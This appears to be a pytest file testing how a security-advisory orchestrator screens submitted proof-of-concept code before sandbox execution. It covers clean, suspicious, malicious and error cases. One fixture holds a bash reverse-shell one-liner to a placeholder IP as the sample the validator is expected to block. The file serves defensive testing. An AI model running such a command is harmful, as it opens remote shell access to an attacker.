# SPDX-License-Identifier: Apache-2.0
"""Orchestrator pre-flight validation integration tests."""

from __future__ import annotations

from unittest.mock import AsyncMock, MagicMock

import httpx
import pytest
from sqlalchemy import select

from agents.env_builder import DetectedStack, EnvBuildResult
from agents.orchestrator import AdvisoryWorkflowParams, AdvisoryWorkflowState, run_advisory_workflow
from agents.sandbox_executor import ExecutionResult, PocType
from config import GovernanceConfig, GovernanceRule, RepoConfig
from models import AgentActionLog, Finding, FindingStatus, Severity, SSVCAction, WorkflowKind
from tools.github import GitHubClient
from tools.scm.github import GitHubSCMProvider
from tools.slack import SlackClient


def _make_scm(gh: object) -> GitHubSCMProvider:
    return GitHubSCMProvider.from_client(gh)  # type: ignore[arg-type]


def _repo(governance: GovernanceConfig | None = None) -> RepoConfig:
    gov = (
        governance
        if governance is not None
        else GovernanceConfig(
            notify=[GovernanceRule(severity=[Severity.high])],
        )
    )
    return RepoConfig(
        name="demo",
        github_org="acme",
        github_repo="app",
        slack_channel="#security",
        allowed_workflows=[],
        notify_on_severity=["high"],
        require_approval_for=["critical"],
        issue_trackers=[],
        governance=gov,
    )


def _slack_transport_ok() -> httpx.MockTransport:
    def handler(request: httpx.Request) -> httpx.Response:
        if "chat.postMessage" in str(request.url):
            return httpx.Response(200, json={"ok": True, "channel": "C123", "ts": "1234.5678"})
        return httpx.Response(404, json={"ok": False})

    return httpx.MockTransport(handler)


def _finding_with_poc(
    session,
    *,
    reproduction: str | None = "requests.get('http://localhost')",
    cwe_ids: list[str] | None = None,
) -> Finding:
    f = Finding(
        workflow=WorkflowKind.advisory,
        repo_name="acme/app",
        source_ref="https://github.com/advisories/GHSA-TEST",
        severity=Severity.high,
        ssvc_action=SSVCAction.act,
        status=FindingStatus.unconfirmed,
        triage_confidence=0.9,
        title="Test advisory",
        reproduction=reproduction,
        cwe_ids=cwe_ids if cwe_ids is not None else ["CWE-918"],
    )
    session.add(f)
    return f


# ---------------------------------------------------------------------------
# Happy path: PoC present, CLEAN verdict → continues to reporting → done
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_preflight_clean_continues_to_done(db_session, mocker, tmp_path) -> None:
    repo = _repo()

    async def fake_triage(session, *args: object, **kwargs: object) -> Finding:
        f = _finding_with_poc(session, reproduction="requests.get('http://localhost/admin')")
        await session.flush()
        return f

    mocker.patch("agents.orchestrator.advisory_triage.run_advisory_triage", side_effect=fake_triage)
    mocker.patch(
        "agents.orchestrator.sandbox_phase.build_environment",
        new_callable=AsyncMock,
        return_value=EnvBuildResult(
            image_tag="sandbox:latest",
            repo_path=tmp_path,
            detected_stack=DetectedStack.PYTHON,
            build_log="ok",
        ),
    )
    mocker.patch(
        "agents.orchestrator.sandbox_phase.execute_poc",
        new_callable=AsyncMock,
        return_value=ExecutionResult(
            confidence_tier=FindingStatus.confirmed_low,
            evidence_excerpt="exploit ok",
            raw_stdout="exploit ok",
            raw_stderr="",
            elapsed_seconds=1.0,
            poc_type=PocType.RESEARCHER_SUBMITTED,
            exit_code=0,
        ),
    )

    async with httpx.AsyncClient(base_url="https://slack.com/api", transport=_slack_transport_ok()) as http:
        slack = SlackClient("xoxb-test", client=http)
        scm = _make_scm(MagicMock(spec=GitHubClient))
        run = await run_advisory_workflow(
            db_session, repo, scm, http, slack, AdvisoryWorkflowParams(ghsa_id="GHSA-TEST-ABCD-EFGH", work_dir=tmp_path)
        )

    assert run.state == AdvisoryWorkflowState.done.value
    assert run.completed_at is not None

    # Verify pre-flight action log exists
    logs = (
        (await db_session.execute(select(AgentActionLog).where(AgentActionLog.workflow_run_id == run.id)))
        .scalars()
        .all()
    )
    preflight_logs = [row for row in logs if row.tool_name == "poc_preflight.validate"]
    assert len(preflight_logs) == 1
    assert "clean" in (preflight_logs[0].tool_output or "").lower()


# ---------------------------------------------------------------------------
# No PoC data → skip pre-flight → reporting → done
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_no_poc_skips_preflight(db_session, mocker) -> None:
    repo = _repo()

    async def fake_triage(session, *args: object, **kwargs: object) -> Finding:
        f = _finding_with_poc(session, reproduction=None)
        await session.flush()
        return f

    mocker.patch("agents.orchestrator.advisory_triage.run_advisory_triage", side_effect=fake_triage)

    async with httpx.AsyncClient(base_url="https://slack.com/api", transport=_slack_transport_ok()) as http:
        slack = SlackClient("xoxb-test", client=http)
        scm = _make_scm(MagicMock(spec=GitHubClient))
        run = await run_advisory_workflow(
            db_session, repo, scm, http, slack, AdvisoryWorkflowParams(ghsa_id="GHSA-TEST-ABCD-EFGH")
        )

    assert run.state == AdvisoryWorkflowState.done.value

    # No pre-flight action log
    logs = (
        (await db_session.execute(select(AgentActionLog).where(AgentActionLog.workflow_run_id == run.id)))
        .scalars()
        .all()
    )
    preflight_logs = [row for row in logs if row.tool_name == "poc_preflight.validate"]
    assert preflight_logs == []


# ---------------------------------------------------------------------------
# SUSPICIOUS verdict → pre_flight_suspicious (parked)
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_preflight_suspicious_parks_workflow(db_session, mocker) -> None:
    repo = _repo()

    # PoC that triggers network + obfuscation → SUSPICIOUS
    poc = "import urllib.request\nresult = eval(payload)\n"

    async def fake_triage(session, *args: object, **kwargs: object) -> Finding:
        f = _finding_with_poc(session, reproduction=poc)
        await session.flush()
        return f

    mocker.patch("agents.orchestrator.advisory_triage.run_advisory_triage", side_effect=fake_triage)

    async with httpx.AsyncClient(base_url="https://slack.com/api", transport=_slack_transport_ok()) as http:
        slack = SlackClient("xoxb-test", client=http)
        scm = _make_scm(MagicMock(spec=GitHubClient))
        run = await run_advisory_workflow(
            db_session, repo, scm, http, slack, AdvisoryWorkflowParams(ghsa_id="GHSA-TEST-ABCD-EFGH")
        )

    assert run.state == AdvisoryWorkflowState.awaiting_preflight_decision.value
    # Not terminal — completed_at stays None
    assert run.completed_at is None


# ---------------------------------------------------------------------------
# MALICIOUS verdict → pre_flight_blocked (terminal)
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_preflight_malicious_blocks_workflow(db_session, mocker) -> None:
    repo = _repo()

    poc = "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"

    async def fake_triage(session, *args: object, **kwargs: object) -> Finding:
        f = _finding_with_poc(session, reproduction=poc, cwe_ids=["CWE-78"])
        await session.flush()
        return f

    mocker.patch("agents.orchestrator.advisory_triage.run_advisory_triage", side_effect=fake_triage)

    async with httpx.AsyncClient(base_url="https://slack.com/api", transport=_slack_transport_ok()) as http:
        slack = SlackClient("xoxb-test", client=http)
        scm = _make_scm(MagicMock(spec=GitHubClient))
        run = await run_advisory_workflow(
            db_session, repo, scm, http, slack, AdvisoryWorkflowParams(ghsa_id="GHSA-TEST-ABCD-EFGH")
        )

    assert run.state == AdvisoryWorkflowState.pre_flight_blocked.value
    assert run.completed_at is not None  # terminal

    # Action log records the malicious verdict
    logs = (
        (await db_session.execute(select(AgentActionLog).where(AgentActionLog.workflow_run_id == run.id)))
        .scalars()
        .all()
    )
    preflight_logs = [row for row in logs if row.tool_name == "poc_preflight.validate"]
    assert len(preflight_logs) == 1
    assert "malicious" in (preflight_logs[0].tool_output or "").lower()


# ---------------------------------------------------------------------------
# Pre-flight error → fail-closed to SUSPICIOUS
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_preflight_error_fails_closed_to_suspicious(db_session, mocker) -> None:
    repo = _repo()

    async def fake_triage(session, *args: object, **kwargs: object) -> Finding:
        f = _finding_with_poc(session, reproduction="some poc code")
        await session.flush()
        return f

    mocker.patch("agents.orchestrator.advisory_triage.run_advisory_triage", side_effect=fake_triage)
    mocker.patch(
        "agents.orchestrator.advisory_preflight.run_preflight",
        side_effect=RuntimeError("unexpected parser error"),
    )

    async with httpx.AsyncClient(base_url="https://slack.com/api", transport=_slack_transport_ok()) as http:
        slack = SlackClient("xoxb-test", client=http)
        scm = _make_scm(MagicMock(spec=GitHubClient))
        run = await run_advisory_workflow(
            db_session, repo, scm, http, slack, AdvisoryWorkflowParams(ghsa_id="GHSA-TEST-ABCD-EFGH")
        )

    assert run.state == AdvisoryWorkflowState.pre_flight_suspicious.value


# ---------------------------------------------------------------------------
# Empty reproduction string → skip pre-flight (falsy)
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_empty_reproduction_skips_preflight(db_session, mocker) -> None:
    repo = _repo()

    async def fake_triage(session, *args: object, **kwargs: object) -> Finding:
        f = _finding_with_poc(session, reproduction="")
        await session.flush()
        return f

    mocker.patch("agents.orchestrator.advisory_triage.run_advisory_triage", side_effect=fake_triage)

    async with httpx.AsyncClient(base_url="https://slack.com/api", transport=_slack_transport_ok()) as http:
        slack = SlackClient("xoxb-test", client=http)
        scm = _make_scm(MagicMock(spec=GitHubClient))
        run = await run_advisory_workflow(
            db_session, repo, scm, http, slack, AdvisoryWorkflowParams(ghsa_id="GHSA-TEST-ABCD-EFGH")
        )

    assert run.state == AdvisoryWorkflowState.done.value
